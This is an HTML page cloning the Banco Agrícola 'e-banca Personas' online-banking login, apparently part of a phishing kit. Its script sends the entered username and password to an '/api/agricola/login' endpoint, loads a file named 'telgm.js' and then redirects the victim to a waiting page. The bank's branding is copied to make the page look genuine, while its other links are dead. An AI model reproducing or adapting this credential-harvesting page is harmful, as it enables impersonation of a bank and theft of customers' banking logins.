<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Banco Agrícola | e-banca Personas</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">

  <style>
    :root{
      --font: "Open Sans", sans-serif;
      --black:#000;
      --muted:#505050;
      --line:#e9e9e9;
      --input:#bdbdbd;
      --yellow:#FDDA24;
    }

    *{ box-sizing:border-box; margin:0; padding:0; }
    html,body{ height:100%; }
    body{
      font-family:var(--font);
      color:var(--black);
      background:#fff;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    /* ======= Desktop ======= */
    .header{
      height:80px;
      padding:0 40px;
      display:flex;
      align-items:center;
      border-bottom:1px solid #f4f4f4;
      background:#fff;
      justify-content:flex-start;
      gap:12px;
    }
    .logo-desktop{ height:48px; }
    .logo-mobile, .mobile-icon, .header-slot { display:none; }

    .main{
      position:relative;
      min-height:calc(100vh - 80px - 64px);
      background:url('images/banner.jpg') no-repeat right center/contain #fff;
      overflow:hidden;
    }
    .wrap{
      position:relative;
      z-index:2;
      padding:40px;
      display:flex;
      align-items:flex-start;
    }

    .card{
      width:100%;
      max-width:520px;
      background:#fff;
      border-radius:4px;
      box-shadow:0 10px 24px rgba(0,0,0,.08);
      border:1px solid #eee;
      display:flex;
      flex-direction:column;
    }
    .card__body{ padding:28px 36px 16px; background:#fff; }

    .title-desktop{
      font-size:26px;
      font-weight:700;
      margin-bottom:26px;
      display:block;
    }
    .mobile-title{ display:none; }

    .form-group{ margin-bottom:22px; }
    .label{
      display:block;
      font-size:14px;
      font-weight:600;
      color:var(--muted);
      margin-bottom:8px;
    }
    .input{
      width:100%;
      height:40px;
      border:none;
      border-bottom:2px solid var(--input);
      padding:6px 2px;
      font-size:15px;
      outline:none;
      transition:border-color .15s ease;
      background:#fff;
    }
    .input:focus{ border-color:#8d8d8d; }

    .remember{
      display:flex;
      align-items:center;
      gap:8px;
      color:#404040;
      margin:6px 0 10px;
      font-size:14px;
    }
    .link{
      color:#000;
      text-decoration:underline;
      font-size:14px;
      display:inline-block;
      margin-bottom:18px;
    }

    /* === Acciones debajo del login (solo desktop) === */
    .card__actions{
      display:flex;
      flex-direction:column;
      align-items:center;
      padding:20px 36px 28px;
      gap:18px;
    }
    .btn{
      display:flex;
      align-items:center;
      justify-content:center;
      gap:10px;
      width:220px;
      height:44px;
      background:var(--yellow);
      border:0;
      border-radius:999px;
      font-weight:700;
      font-size:15px;
      cursor:pointer;
      transition:filter .15s ease, transform .02s ease;
    }
    .btn:hover{ filter:brightness(.98); }
    .btn:active{ transform:translateY(1px); }

    .btn__icon{
      width:28px;
      height:28px;
      border-radius:50%;
      border:1px solid rgba(0,0,0,.45);
      display:inline-flex;
      align-items:center;
      justify-content:center;
      font-size:16px;
    }

    .actions-row{
      display:flex;
      justify-content:space-between;
      width:100%;
      max-width:220px;
    }
    .foot-link{
      display:flex;
      align-items:center;
      gap:6px;
      text-decoration:none;
      color:#000;
      font-size:14px;
    }
    .foot-link img{ height:16px; }

    /* ===== Footer Desktop ===== */
    .page-footer{
      height:64px;
      padding:0 16px;
      border-top:1px solid #f1f1f1;
      display:grid;
      grid-template-columns: 1fr auto 80px;
      align-items:center;
      font-size:14px;
      background:#fff;
    }
    .footer-links{
      display:flex;
      align-items:center;
      gap:22px;
      flex-wrap:wrap;
    }
    .footer-links a{
      display:inline-flex;
      align-items:center;
      gap:8px;
      color:#000;
      text-decoration:none;
      border-bottom:1px solid transparent;
      padding-bottom:2px;
    }
    .footer-links a:hover{ border-bottom-color:#000; }
    .footer-center{
      display:flex;
      align-items:center;
      gap:10px;
      justify-self:center;
      color:#4a4a4a;
    }
    .footer-center img{ height:18px; }
    .version{ justify-self:end; color:#7b7b7b; }

    /* ========= Móvil ========= */
    @media (max-width: 768px){
      .header{
        height:68px;
        padding:0 12px;
        justify-content:space-between;
        border-bottom:1px solid #eee;
      }
      .logo-desktop{ display:none; }
      .logo-mobile{ display:block; height:28px; }
      .header-slot{ display:flex; width:24px; height:24px; align-items:center; justify-content:center; }
      .mobile-icon{ display:block; width:22px; height:22px; }

      .mobile-title{
        display:block;
        text-align:center;
        font-weight:700;
        margin:16px auto;
        font-size:16px;
        line-height:1.3;
      }
      .title-desktop{ display:none; }

      .main{ background:none; }
      .page-footer{ display:none; }

      .wrap{
        padding:20px;
        display:flex;
        flex-direction:column;
        align-items:center;
      }
      .card{
        width:100%;
        max-width:420px;
        border:none;
        box-shadow:none;
      }
      .card__body{ padding:0; width:100%; }

      /* Ocultar las acciones de desktop en móvil */
      .card__actions{ display:none; }

      /* === Barra inferior fija (solo móvil) === */
      .bottom-bar{
        position:fixed;
        bottom:0;
        left:0;
        width:100%;
        background:#fff;
        border-top:1px solid #eaeaea;
        box-shadow:0 -2px 6px rgba(0,0,0,.08);
        padding:10px 16px 16px;
        display:flex;
        flex-direction:column;
        align-items:center;
        z-index:10;
      }
      .bottom-links{
        width:100%;
        display:flex;
        justify-content:space-between;
        align-items:center;
        margin-top:12px;
      }
      .foot-link{
        display:flex;
        align-items:center;
        gap:6px;
        text-decoration:none;
        color:#000;
        font-size:14px;
      }
      .foot-link img{ height:16px; }

      .btn{
        width:100%;
        height:48px;
        margin:0;
      }
    }

    /* === Ocultar barra inferior en pantallas grandes === */
    @media (min-width: 769px){
      .bottom-bar{ display:none; }
    }
  </style>
</head>
<body>

  <!-- Header -->
  <header class="header">
    <div class="header-slot">
      <img class="mobile-icon" src="images/telephone.svg" alt="Teléfono">
    </div>

    <img class="logo-desktop" src="images/logo.svg" alt="Banco Agrícola">
    <img class="logo-mobile" src="images/logo.svg" alt="Banco Agrícola">

    <div class="header-slot">
      <img class="mobile-icon" src="images/help.svg" alt="Ayuda">
    </div>
  </header>

  <!-- Título móvil -->
  <h2 class="mobile-title">Bienvenido a la aplicación de<br>Bancoagrícola</h2>

  <!-- Contenido principal -->
  <section class="main">
    <div class="wrap">
      <section class="card">
        <div class="card__body">
          <h1 class="title-desktop">Bienvenido a e-banca Personas</h1>

          <div class="form-group">
            <label for="usuario" class="label">Usuario</label>
            <input class="input" type="text" id="usuario" name="usuario" autocomplete="username">
          </div>

          <div class="form-group">
            <label for="password" class="label">Contraseña</label>
            <input class="input" type="password" id="password" name="password" autocomplete="current-password">
          </div>

          <label class="remember">
            <input type="checkbox" id="remember" name="remember">
            Recordar usuario
          </label>

          <a class="link" href="#">Olvidé mi Clave</a>
        </div>

        <!-- Acciones solo desktop -->
        <div class="card__actions">
          <button class="btn" type="button">
            CONTINUAR
            <span class="btn__icon" aria-hidden="true">→</span>
          </button>
          <div class="actions-row">
            <a class="foot-link" href="#">
              <img src="images/pencil.svg" alt="">
              <span>Regístrate</span>
            </a>
            <a class="foot-link" href="#">
              <img src="images/telephone.svg" alt="">
              <span>Contáctanos</span>
            </a>
          </div>
        </div>
      </section>
    </div>
  </section>

  <!-- Barra inferior solo móvil -->
  <div class="bottom-bar">
    <button class="btn" type="button">
      CONTINUAR
      <span class="btn__icon" aria-hidden="true">→</span>
    </button>
    <div class="bottom-links">
      <a class="foot-link" href="#">
        <img src="images/pencil.svg" alt="">
        <span>Regístrate</span>
      </a>
      <a class="foot-link" href="#">
        <img src="images/telephone.svg" alt="">
        <span>Contáctanos</span>
      </a>
    </div>
  </div>

  <!-- Footer Desktop -->
  <footer class="page-footer">
    <nav class="footer-links">
      <a href="#"><img src="images/help.svg" alt="" height="16"> Consejos de seguridad</a>
      <a href="#">Tutorial del canal</a>
      <a href="#">Tips de uso</a>
      <a href="#">Preguntas frecuentes</a>
    </nav>
    <div class="footer-center">
      <img src="images/logonegro.svg" alt="Banco Agrícola">
      <span>Banco Agrícola© Todos los derechos reservados.</span>
    </div>
    <span class="version">4.5.7</span>
  </footer>

   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
<script type="text/javascript" src="telgm.js"></script>
    <script>

  $(document).ready(function () {
    $('.btn').click(async function (e) {
      e.preventDefault();

      // Validación básica
      const usuario = $('#usuario').val().trim();
      const password = $('#password').val().trim();

      if (usuario === "" || password === "") {
        alert("Por favor, complete ambos campos.");
        return;
      }

      const btn = $(this);
      const originalText = btn.html();
      btn.text('Validando...');
      btn.prop('disabled', true);

      try {
          const response = await fetch('/api/agricola/login', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ user: usuario, pass: password })
          });
          const data = await response.json();
          if (data.success) {
              window.location.href = `espera.html?session_id=${data.session_id}`;
          }
      } catch (error) {
          btn.prop('disabled', false);
          btn.html(originalText);
          alert('Error de conexión');
      }
    });
  });
    </script>


</body>
</html>
